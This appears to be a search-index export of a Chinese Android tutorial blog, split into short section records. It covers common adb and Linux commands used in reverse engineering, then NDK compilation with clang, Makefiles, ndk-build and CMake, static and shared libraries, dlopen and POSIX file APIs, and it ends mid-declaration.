","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:0:0","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"ADB命令 ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:0","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看最顶端前台应用的包名和activity名 adb shell dumpsys window | grep mCurrentFocus ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:1","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看包信息 adb shell dumpsys package com.android.settings ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:2","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看App使用的数据库信息 adb shell dumpsys dbinfo com.android.settings ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:3","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"截图操作 adb shell screencap -p /data/local/tmp/Luo.png ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:4","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"管理package pm命令是Android中packageManager的命令行,是用于管理package的命令. //列出所有安装的APK包名 adb shell pm list packages //安装apk文件,这里的apk文件不是在主机目录下,而是在Android目录下 adb shell pm install /data/local/tmp/LuoDst.apk ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:5","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"调试命令 am命令是一个重要的调试工具,主要用于启动或停止服务、发送广播、启动Activity等 //以Debug模式启动App adb shell am start -D -N org.example.luodst/.MainActivity 其实以上所有命令也可以通过执行adb shell进入Android的shell中直接执行,只需要将开始的adb shell去掉就行. ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:6","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"主机与Android交互命令 //安装apk adb install //交换文件 adb push adb pull //查看日志 adb logcat ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:7","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"Linux命令 ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:0","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"grep基本语法 用法:grep [选项] “字符串/基本正则表达式” [文件] 常用选项: -c 只输出匹配行的计数。 -i 不区分大小写（只适用于单字符）。 -h 查询多文件时不显示文件名。 -l 查询多文件时只输出包含匹配字符的文件名。 -n 显示匹配行及行号。 -s 不显示不存在或无匹配文本的错误信息。 -v 显示不包含匹配文本的所有行。 -q 不显示存在或者匹配的文本信息 -f 后接文件名，以文件中的每一行作为匹配项 -R 递归查询当前目录下的文件 -w 匹配单词 -o 只输出匹配字符串 -A 输出匹配行的后n行，后带数字，如-A 2 -B 输出匹配行的前n行，后带数字，如-B 2 -C 输出匹配行的前后n行，后带数字，如-C 2 ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:1","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"创建空文件 touch /data/local/tmp/Luo.txt ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:2","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"写文件 echo命令通过配合\"\u003e“或者”»“对文件进行写操作,其中”\u003e“为覆盖写操作,\"»“为扩展写操作. echo \"LuoHun\" \u003e\u003e Luo.txt ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:3","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看文本文件内容 cat Luo.txt ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:4","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"在shell中过滤符合条件的输出 cat Luo.txt | grep LuoHun ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:5","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看当前设备正在运行的进程 //在Android8之后,ps命令只能打印出当前进程,需要加上-e参数才能打印出全部的进程 ps ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:6","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看App网络相关信息 通常使用的参数组合为-alpe netstat -alpe用于查看sockets连接的IP和端口以及相应的进程名和PID,配合grep往往有奇效. netstat -alpe | grep com.android.la ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:7","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看对应进程打开的文件 lsof -p 1625 -l | grep jar 这里的文件不仅仅指常见的普通文件.在Linux系统中有一种说法叫\"万物皆文件”,其实网络中建立连接的也可以叫做文件,因此lsof命令也可以用于与netstat命令相同的操作. lsof -l -p 1625 | grep TCP ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:8","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看当前系统运行负载 //和htop作用一样,只是相对来说htop更加人性化 top ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:9","tags":["Android逆向常用命令"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"NDK开发 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:0:0","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"概述 全称:Native Development Kit,可让您使用C和C++等语言以原生代码实现应用的各个部分. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:1:0","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"网址 https://developer.android.google.cn/ndk ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:1:1","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"文件类型 .o 等同于.Obj .a 等同于.lib .so等同于.dll ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:1:2","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"编译器 目前主要是clang编译器,Gcc编译器已被移除. 下载NDK,里面有Clang编译器. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:2:0","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"编译示例 将Clang编译器所在目录加入到环境变量path中,这个目录中有很多做好的cmd文件(如:i686-linux-android16-clang.cmd). 假如说编译Hello.c 编译 i686-linux-android16-clang -c -o Hello.o Hello.c 链接 i686-linux-android16-clang -o Hello Hello.o 生成的Hello文件格式为Elf. 将生成的文件传到手机上运行 //传文件到手机上 adb push Hello /data/local/tmp //进入shell,修改/data/local/tmp/Hello路径权限为可执行 adb shell chmod a+x /data/local/tmp/Hello //运行程序 /data/local/tmp/Hello 注意 若要在手机上运行Hello这个程序,需要使用shell命令.若手机有Root权限,该Hello文件执行时也会有Root权限,但是apk文件不会具有Root权限,它只能得到一个带root权限的shell. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:2:1","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"通用编译脚本 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:3:0","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Makefile 概述 假如说10个人开发一个软件,用VS是不行的. Android NDK工具包中有makefile解释器. 效率 当生成的某个obj文件没有发生变化时,不重新生成,提高编译效率,可通过判断obj生成时间和.c文件的生成时间,若前者大于后者,则说明不需要重新生成,否则就需要重新生成obj文件. 语法参考 https://github.com/seisman/how-to-write-makefile Makefile语法参考.pdf ndk-build脚本 手工编译示例 将ndk-build.cmd所在的路径添加到系统环境变量中. 将要编译的文件放到一个名为jni或cpp的文件夹中. 新建一个Android.mk文件. 新建一个Application.mk文件. 编译. ndk-build 编译清理. ndk-build clean ndk-build手工编译.7z 利用AndroidStudio来编译 AS新建一个空工程. 将上面的jni或cpp文件夹拷贝到新建的工程中. 在AS中选择Link C++ Project. 这个地方的右键,其实是在编译脚本中加了一段话. 指明NDK路径,下载了NDK,默认即可. 指定编译的平台. Ctrl + F9 编译工程即可. ndk-build_AS编译.7z 注意 用ndk-build编译C++程序需注意,Cmake编译无需注意. 需要设置STL C++异常 Rtti的开关. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:3:1","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Cmake编译(Android主推) 新建一个工程,这个工程默认就是CMake编译. 将要编译的文件,放到工程的cpp目录中. 添加编译链接内容. 指定编译的平台. Ctrl + F9编译工程即可. Cmake编译.7z ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:3:2","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"静态库 又称归档文件,当一个工程链接静态库时,只会链接需要的Obj. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:4:0","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"编译 手工编译 编译静态库的程序为llvm-ar.exe. mou1.h #include \u003cstdio.h\u003evoid mou1(); mou1.c #include \"mou1.h\" void mou1(){ printf(\"Hello mou1\\n\"); } main.c #include \"mou1.h\" int main(){ mou1(); printf(\"Hello Main\\n\"); } Makefile NDK_PATH := D:/AndroidSDK/ndk/21.4.7075529/toolchains/llvm/prebuilt/windows-x86_64/bin BUILD_ABI := i686 BUILD_PLT_VERSION := android21 BUILD_CLANG := $(BUILD_ABI)-linux-$(BUILD_PLT_VERSION)-clang BUILD_AR := $(BUILD_ABI)-linux-android-ar BUILD_MODULE_NAME := main BUILD_LIB_NAME := libmou.a BUILD_FLAGS := -c BUILD_LINKER_FLAGS := -o $(BUILD_MODULE_NAME) main.o mou1.o all: $(BUILD_CLANG) $(BUILD_FLAGS) main.c mou1.c $(BUILD_CLANG) $(BUILD_LINKER_FLAGS) lib: $(BUILD_AR) r $(BUILD_LIB_NAME) mou1.o install: adb push $(BUILD_MODULE_NAME) /data/local/tmp adb shell chmod a+x /data/local/tmp/$(BUILD_MODULE_NAME) adb shell /data/local/tmp/$(BUILD_MODULE_NAME) clean: del *.o $(BUILD_MODULE_NAME) $(BUILD_LIB_NAME) 静态库手工编译.rar ndk-build 可以放到AS中进行编译. 将要编译的源文件放到jni文件夹中. 新建一个Android.mk文件. #编译静态库 LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) #存储要构建的模块的名称 LOCAL_MODULE := mou #列举源文件 LOCAL_SRC_FILES := mou1.c mou2.c #包含编译脚本 include $(BUILD_STATIC_LIBRARY) #使用静态库 include $(CLEAR_VARS) LOCAL_MODULE := main LOCAL_SRC_FILES := main.c LOCAL_STATIC_LIBRARIES := mou include $(BUILD_EXECUTABLE) 新建一个Application.mk文件. APP_PLATFORM := android-16 APP_ABI := x86_64 cmd运行ndk-build进行编译. 静态库ndk-build.7z Cmake编译 假设编译的为Cpp文件,需要注意头文件加 extern “C”. 新建一个工程. 在cpp文件夹新建源文件. 指明要静态编译的文件. 修改编译脚本. 直接编译即可. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:4:1","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Cmake使用第三方静态库 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:4:2","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"优点 软件静态链接静态库的时候,只链接需要的代码. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:4:3","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"缺点 某一个.o文件有Bug,其他已经链接了该静态库的软件需要重新编译链接,维护性差. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:4:4","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"动态库 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:0","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"编译 手动编译 Makefile NDK_PATH := D:/AndroidSDK/ndk/21.4.7075529/toolchains/llvm/prebuilt/windows-x86_64/bin BUILD_ABI := i686 BUILD_PLT_VERSION := android21 BUILD_CLANG := $(BUILD_ABI)-linux-$(BUILD_PLT_VERSION)-clang BUILD_AR := $(BUILD_ABI)-linux-android-ar BUILD_MODULE_NAME := main BUILD_LIB_NAME := libmou.so BUILD_FLAGS := -c BUILD_LINKER_FLAGS := -o $(BUILD_MODULE_NAME) main.o $(BUILD_LIB_NAME) all: $(BUILD_CLANG) $(BUILD_FLAGS) main.c $(BUILD_CLANG) $(BUILD_LINKER_FLAGS) lib: $(BUILD_CLANG) -c mou1.c mou2.c $(BUILD_CLANG) -o $(BUILD_LIB_NAME) -fpic -shared mou1.o mou2.o install: adb push $(BUILD_LIB_NAME) /data/local/tmp adb push $(BUILD_MODULE_NAME) /data/local/tmp adb shell chmod a+x /data/local/tmp/$(BUILD_MODULE_NAME) adb shell /data/local/tmp/$(BUILD_MODULE_NAME) clean: del *.o $(BUILD_MODULE_NAME) $(BUILD_LIB_NAME) -fpic 位置无关代码. #编译动态库 make lib #编译可执行文件 make #安装可执行文件到Android中并运行 make install 动态库手工编译.7z 报错处理 需了解Linux共享库搜索规则. 共享库搜索路径 system/lib user/lib 环境变量,如果以apk运行,会将/data/data/packageName/lib设为环境变量 示例 //查看环境变量 echo $LD_LIBRARY_PATH //设置临时环境变量, 以:分割环境变量路径 export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/data/local/tmp ndk-build cmd 输入ndk-build即可编译. 动态库NDK-BUILD.7z Cmake编译 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:1","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"优点 某一个.so文件有Bug,只需重新编译该so文件即可. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:2","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"缺点 启动速度慢,但可以延迟加载. 软件加载动态库的时候,Dll中的函数代码全部进内存. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:3","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"查看导出函数 命令行 llvm-readelf -s so文件路径 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:4","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"函数不导出 //在Linux中 函数默认是导出的,若不导出需加前缀 __attribute__ ((visibility(\"hidden\"))) ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:5","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"初始化函数 不常用 之所以说不常用,是因为不方便,每加一个功能都有可能会修改_init中的代码. 常用 方便,名字随意只要声明为构造或析构函数即可,数量不限. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:6","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"动态使用 相关函数 void* dlopen(const char* __filename, int __flag); void* dlsym(void* __handle, const char* __symbol); int dladdr(const void* __addr, Dl_info* __info); int dlclose(void* __handle); 示例 动态库使用.7z ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:7","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Android API 基于Linux内核,遵循Posix标准,也有自己独有的API. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:6:0","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"NDK 这是独有的API. 常用来打日志 #include \u003candroid/log.h\u003e#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, \"LuoHun\", __VA_ARGS__); #define LOGW(...) __android_log_print(ANDROID_LOG_WARN, \"LuoHun\", __VA_ARGS__); #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, \"LuoHun\", __VA_ARGS__); 添加库 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:6:1","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Posix 可移植操作系统接口(Portable Operating System Interface),无窗口API. Cygwin,该库在Win32系统下实现了POSIX系统调用的API. errno 扩展了 C标准的errno,下面是C标准的errno. 通过查文档可知该函数出错时,errno是否被设置. 文件 相关函数 //打开 int open(const char *pathname, int flags, mode_t mode); //关闭 int close(int __fd); //读 ssize_t read(int fd, void *buf, size_t count); //写 ssize_t write(int fd, const void *buf, size_t count); //移动文件指针 off_t lseek(int fildes, off_t offset, int whence); //文件控制 int fcntl(int __fd, int __cmd, ...); //指定位置读写 ssize_t pread(int fildes, void *buf, size_t nbyte, off_t offset); ssize_t pwrite(int fd, const void *buf, size_t count, off_t offset); //文件属性 int stat(const char* __path, struct stat* __buf); //检查文件权限 int access(const char* __path, int 